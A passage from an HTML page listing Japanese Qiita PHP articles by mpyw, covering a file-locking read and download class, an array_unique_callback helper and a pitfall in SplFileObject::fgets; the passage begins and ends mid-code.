        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">locked</span> <span class="o">=</span> <span class="nb">flock</span><span class="p">(</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">,</span> <span class="nx">LOCK_EX</span> <span class="o">|</span> <span class="nx">self</span><span class="o">::</span><span class="nv">$blockmode</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Failed to lock file '</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nb">ftruncate</span><span class="p">(</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="k">or</span> <span class="k">false</span> <span class="o">===</span> <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">,</span> <span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Unknown stream error on '</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
    <span class="p">}</span>

   <span class="sd">/**</span>
<span class="sd">    * Use instead of readfile().</span>
<span class="sd">    * Automatically locked by LOCK_SH mode.</span>
<span class="sd">    * This also supports automatically sending Content-Type header.</span>
<span class="sd">    * </span>
<span class="sd">    * @access public</span>
<span class="sd">    * @static</span>
<span class="sd">    * @param  string  $filename</span>
<span class="sd">    * @param  boolean [$send_header] Whether automatically send Content-Type header.</span>
<span class="sd">    * @return integer                The number of read bytes.</span>
<span class="sd">    */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$send_header</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$file</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">factory</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$send_header</span> <span class="o">&amp;&amp;</span> <span class="nb">headers_sent</span><span class="p">())</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Headers are already sent'</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">locked</span> <span class="o">=</span> <span class="nb">flock</span><span class="p">(</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">,</span> <span class="nx">LOCK_SH</span> <span class="o">|</span> <span class="nx">self</span><span class="o">::</span><span class="nv">$blockmode</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Failed to lock file '</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$send_header</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$finfo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">finfo</span><span class="p">(</span><span class="nx">FILEINFO_MIME</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">===</span> <span class="nv">$type</span> <span class="o">=</span> <span class="nv">$finfo</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Failed to get content type of '</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: '</span> <span class="o">.</span> <span class="nv">$type</span><span class="p">);</span>
            <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">headers_preset</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">===</span> <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">fpassthru</span><span class="p">(</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Unknown stream error on '</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">headers_preset</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
        <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
    <span class="p">}</span>

   <span class="sd">/**</span>
<span class="sd">    * Headers for downloading are automatically sent.</span>
<span class="sd">    * This also enables users to download multibyte-named files properly.</span>
<span class="sd">    * </span>
<span class="sd">    * @access public</span>
<span class="sd">    * @param  string $input_filename    Filename in local,</span>
<span class="sd">    *                                   and used for downloading when $output_filename omitted.</span>
<span class="sd">    * @param  string [$output_filename] Filename used for downloading, automatically converted to UTF-8.</span>
<span class="sd">    * @return integer                   The number of read bytes.</span>
<span class="sd">    */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">download</span><span class="p">(</span><span class="nv">$input_filename</span><span class="p">,</span> <span class="nv">$output_filename</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">static</span> <span class="nv">$pattern</span> <span class="o">=</span> <span class="s1">'/Chrome|Firefox|(Opera)|(MSIE|IEMobile)|(Safari)/'</span><span class="p">;</span>
        <span class="nv">$file</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">factory</span><span class="p">(</span><span class="nv">$input_filename</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">headers_sent</span><span class="p">())</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Headers are already sent'</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">locked</span> <span class="o">=</span> <span class="nb">flock</span><span class="p">(</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">,</span> <span class="nx">LOCK_SH</span> <span class="o">|</span> <span class="nx">self</span><span class="o">::</span><span class="nv">$blockmode</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Failed to lock file '</span> <span class="o">.</span> <span class="nv">$input_filename</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$finfo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">finfo</span><span class="p">(</span><span class="nx">FILEINFO_MIME</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">===</span> <span class="nv">$type</span> <span class="o">=</span> <span class="nv">$finfo</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">(</span><span class="nv">$input_filename</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Failed to get content type of '</span> <span class="o">.</span> <span class="nv">$input_filename</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="k">false</span> <span class="o">===</span> <span class="nv">$size</span> <span class="o">=</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$input_filename</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Failed to get size of '</span> <span class="o">.</span> <span class="nv">$input_filename</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$output_filename</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$output_filename</span> <span class="o">=</span> <span class="nv">$input_filename</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$output_filename</span> <span class="o">=</span> <span class="nb">mb_convert_encoding</span><span class="p">(</span>
            <span class="nv">$output_filename</span><span class="p">,</span>
            <span class="s1">'UTF-8'</span><span class="p">,</span>
            <span class="s1">'ASCII,JIS,UTF-8,CP51932,SJIS-win'</span>
        <span class="p">);</span>
        <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: '</span> <span class="o">.</span> <span class="nv">$type</span><span class="p">);</span>
        <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Length: '</span> <span class="o">.</span> <span class="nv">$size</span><span class="p">);</span>
        <span class="k">switch</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">case</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">])</span><span class="o">:</span>
            <span class="k">case</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">],</span> <span class="nv">$matches</span><span class="p">)</span><span class="o">:</span>
            <span class="k">case</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">:</span>
                <span class="nv">$enc</span> <span class="o">=</span> <span class="s1">'=?utf-8?B?'</span> <span class="o">.</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$output_filename</span><span class="p">)</span> <span class="o">.</span> <span class="s1">'?='</span><span class="p">;</span>
                <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Disposition: attachment; filename="'</span> <span class="o">.</span> <span class="nv">$enc</span> <span class="o">.</span> <span class="s1">'"'</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">:</span>
                <span class="nv">$enc</span> <span class="o">=</span> <span class="s2">"utf-8'ja'"</span> <span class="o">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$output_filename</span><span class="p">);</span>
                <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Disposition: attachment; filename*='</span> <span class="o">.</span> <span class="nv">$enc</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span><span class="o">:</span>
                <span class="nv">$enc</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$output_filename</span><span class="p">);</span>
                <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Disposition: attachment; filename="'</span> <span class="o">.</span> <span class="nv">$enc</span> <span class="o">.</span> <span class="s1">'"'</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">default</span><span class="o">:</span>
                <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Disposition: attachment; filename="'</span> <span class="o">.</span><span class="nv">$output_filename</span> <span class="o">.</span> <span class="s1">'"'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">headers_preset</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">===</span> <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">fpassthru</span><span class="p">(</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Unknown stream error on '</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">headers_preset</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
        <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">factory</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$mode</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$mode</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$error</span> <span class="o">=</span> <span class="nb">error_get_last</span><span class="p">();</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="nb">sprintf</span><span class="p">(</span>
                <span class="s1">'Failed to open file: %s; %s'</span><span class="p">,</span>
                <span class="nv">$filename</span><span class="p">,</span>
                <span class="nv">$error</span><span class="p">[</span><span class="s1">'message'</span><span class="p">]</span>
            <span class="p">));</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nx">self</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fp</span> <span class="o">=</span> <span class="nv">$fp</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">headers_list</span> <span class="o">=</span> <span class="nb">headers_list</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">locked</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">flock</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">,</span> <span class="nx">LOCK_UN</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">headers_preset</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">headers_sent</span><span class="p">())</span> <span class="p">{</span>
            <span class="nb">header_remove</span><span class="p">();</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">headers_list</span> <span class="k">as</span> <span class="nv">$header</span><span class="p">)</span> <span class="p">{</span>
                <span class="nb">header</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nb">fclose</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">);</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div></div>

<p>機能を追加しました。<br>
勝手ながら、CC0ライセンスから2条項BSDライセンスに切り替えさせていただきます。<br>
<a href="https://github.com/Certainist/File" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/Certainist/File</a></p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />63位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>10</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/1044c94d1a7820b255a8">array_unique_callback 的な何か</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-11-29 23:49:27</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="array_unique" class="fragment"></span><a href="#array_unique"><i class="fa fa-link"></i></a><code>array_unique</code>
</h1>

<p><a href="http://us2.php.net/manual/ja/function.array-unique.php" class="autolink" rel="nofollow noopener" target="_blank">http://us2.php.net/manual/ja/function.array-unique.php</a></p>

<p>配列を渡すだけで重複している要素を削除してくれるとっても便利な関数です。しかし、値が文字列にキャスト可能な1次元の配列にしか適用できないという制約があります。これをカスタムするための関数を作ってみましょう。</p>

<h1>
<span id="array_unique_callback" class="fragment"></span><a href="#array_unique_callback"><i class="fa fa-link"></i></a><code>array_unique_callback</code>
</h1>

<p><code>array_filter</code> を <strong>static変数</strong> と絡めて使用するのがネックです。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">array_unique_callback</span><span class="p">(</span><span class="k">array</span> <span class="nv">$array</span><span class="p">,</span> <span class="nx">callable</span> <span class="nv">$callback</span><span class="p">,</span> <span class="nv">$strict</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">array_filter</span><span class="p">(</span>
        <span class="nv">$array</span><span class="p">,</span>
        <span class="k">function</span> <span class="p">(</span><span class="nv">$item</span><span class="p">)</span> <span class="k">use</span> <span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="nv">$strict</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">static</span> <span class="nv">$h</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
            <span class="nv">$r</span> <span class="o">=</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$n</span> <span class="o">=</span> <span class="nv">$callback</span><span class="p">(</span><span class="nv">$item</span><span class="p">),</span> <span class="nv">$h</span><span class="p">,</span> <span class="nv">$strict</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$h</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$n</span><span class="p">;</span>
            <span class="k">return</span> <span class="nv">$r</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<ul>
<li>PHPにありそうな感じの名前にしました。</li>
<li>PHP5.3では <strong>callable</strong> タイプヒンティングを外してください。</li>
<li>
<code>isset</code> を用いて $O(1)$ の探索時間を実現しても良かったのですが、今回はスカラー値以外も比較に使用できるように <code>in_array</code> を使う実装にしました。</li>
</ul>

<p>下に使用例を示します。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="nv">$companies</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'name'</span> <span class="o">=&gt;</span> <span class="s1">'やずや'</span><span class="p">,</span>
        <span class="s1">'phone'</span> <span class="o">=&gt;</span> <span class="s1">'0120-828-828'</span><span class="p">,</span>
        <span class="s1">'category'</span> <span class="o">=&gt;</span> <span class="s1">'サプリメント'</span><span class="p">,</span>
    <span class="p">),</span>
    <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'name'</span> <span class="o">=&gt;</span> <span class="s1">'DHC'</span><span class="p">,</span>
        <span class="s1">'phone'</span> <span class="o">=&gt;</span> <span class="s1">'0120-575-3709'</span><span class="p">,</span>
        <span class="s1">'category'</span> <span class="o">=&gt;</span> <span class="s1">'サプリメント'</span><span class="p">,</span>
    <span class="p">),</span>
    <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'name'</span> <span class="o">=&gt;</span> <span class="s1">'KIRIN'</span><span class="p">,</span>
        <span class="s1">'phone'</span> <span class="o">=&gt;</span> <span class="s1">'0120-111-560'</span><span class="p">,</span>
        <span class="s1">'category'</span> <span class="o">=&gt;</span> <span class="s1">'お酒'</span><span class="p">,</span>
    <span class="p">),</span>
<span class="p">);</span>

<span class="nv">$companies</span> <span class="o">=</span> <span class="nx">array_unique_callback</span><span class="p">(</span>
    <span class="nv">$companies</span><span class="p">,</span>
    <span class="k">function</span> <span class="p">(</span><span class="nv">$company</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$company</span><span class="p">[</span><span class="s1">'category'</span><span class="p">];</span>
    <span class="p">}</span>
<span class="p">);</span>

<span class="nb">print_r</span><span class="p">(</span><span class="nv">$companies</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>Array
(
    [0] =&gt; Array
        (
            [name] =&gt; やずや
            [phone] =&gt; 0120-828-828
            [category] =&gt; サプリメント
        )

    [2] =&gt; Array
        (
            [name] =&gt; KIRIN
            [phone] =&gt; 0120-111-560
            [category] =&gt; お酒
        )

)
</pre></div>
</div>

<h1>
<span id="作ってみたものの" class="fragment"></span><a href="#%E4%BD%9C%E3%81%A3%E3%81%A6%E3%81%BF%E3%81%9F%E3%82%82%E3%81%AE%E3%81%AE"><i class="fa fa-link"></i></a>作ってみたものの・・・</h1>

<p>ぶっちゃけこれぐらい関数化しなくても普通にシンプルに書けるからいらないかも・・・ｗ<br>
連想配列のキーに格納する方法だと、代入式</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$h</span><span class="p">[</span><span class="nv">$c</span><span class="p">[</span><span class="s1">'category'</span><span class="p">]]</span> <span class="o">=</span> <span class="k">true</span>
</pre></div></div>

<p>が必ず <strong>TRUE</strong> と評価されるのでここまで短く書ける。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$companies</span> <span class="o">=</span> <span class="nb">array_filter</span><span class="p">(</span>
    <span class="nv">$companies</span><span class="p">,</span>
    <span class="k">function</span> <span class="p">(</span><span class="nv">$c</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">static</span> <span class="nv">$h</span><span class="p">;</span>
        <span class="k">return</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$h</span><span class="p">[</span><span class="nv">$c</span><span class="p">[</span><span class="s1">'category'</span><span class="p">]])</span> <span class="k">and</span> <span class="nv">$h</span><span class="p">[</span><span class="nv">$c</span><span class="p">[</span><span class="s1">'category'</span><span class="p">]]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">);</span>
</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />64位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>10</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/bfaad8cb2fb8e9eb3215">SplFileObject::fgetsの罠</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-07-11 00:14:45</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p><code>fopen</code>・<code>fgets</code>などの関数から<code>SplFileObject</code>に乗り換えてきてはまった罠。<br>
バグレポート出してやろうかと思ったけど、マニュアルよく読んでみたら仕様っぽいので我慢。<br>
「そんなの知ってるがなｗ」って思った人にはごめんなさい。</p>

<h2>
<span id="code" class="fragment"></span><a href="#code"><i class="fa fa-link"></i></a>Code</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="c1">// empty.txtは0バイトのファイル</span>
<span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"empty.txt"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">);</span>
<span class="nb">var_dump</span><span class="p">(</span>
    <span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">),</span>
    <span class="nb">fgets</span><span class="p">(</span><span class="nv">$fp</span><span class="p">),</span>
    <span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span>
<span class="p">);</span>
<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>

<span class="nv">$file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SplFileObject</span><span class="p">(</span><span class="s2">"empty.txt"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">);</span>
<span class="nb">var_dump</span><span class="p">(</span>
    <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">(),</span>
    <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">fgets</span><span class="p">(),</span>
    <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">()</span>
<span class="p">);</span>
</pre></div></div>

<h2>
<span id="expected-result" class="fragment"></span><a href="#expected-result"><i class="fa fa-link"></i></a>Expected Result</h2>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>bool(false) bool(false) bool(true) bool(false) bool(false) bool(true)
</pre></div></div>

<h2>
<span id="actual-result" class="fragment"></span><a href="#actual-result"><i class="fa fa-link"></i></a>Actual Result</h2>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>bool(false) bool(false) bool(true) bool(false) string(0) "" bool(true)
</pre></div></div>

<p>びっくりしすぎてパソコンに向かって</p>

<p><strong>「ﾊｱｱｱｱｱｱｱｱｱｱｱｱ？？？？？？？？？？？？？？？？」</strong></p>

<p>って叫んだ。</p>

<p>つまりだな・・・それぞれこういう書き方がお作法だということだ。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">手続き型</span></div>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">"data.txt"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">fgets</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="p">{</span>
        <span class="nb">printf</span><span class="p">(</span><span class="s2">"%d行目: %s"</span><span class="p">,</span> <span class="o">++</span><span class="nv">$i</span><span class="p">,</span> <span class="nv">$tmp</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"えふげっつえらー</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"えふーおーぷんえらー</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">オブジェクト指向型</span></div>
<div class="highlight"><pre><span></span><span class="k">try</span> <span class="p">{</span>
    <span class="nv">$file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SplFileObject</span><span class="p">(</span><span class="s2">"data.txt"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">);</span>
    <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">()</span> <span class="k">and</span> <span class="s2">""</span> <span class="o">!==</span> <span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">fgets</span><span class="p">())</span> <span class="p">{</span>
        <span class="nb">printf</span><span class="p">(</span><span class="s2">"%d行目: %s"</span><span class="p">,</span> <span class="o">++</span><span class="nv">$i</span><span class="p">,</span> <span class="nv">$tmp</span><span class="p">);</span>
    <span class="p">}</span>
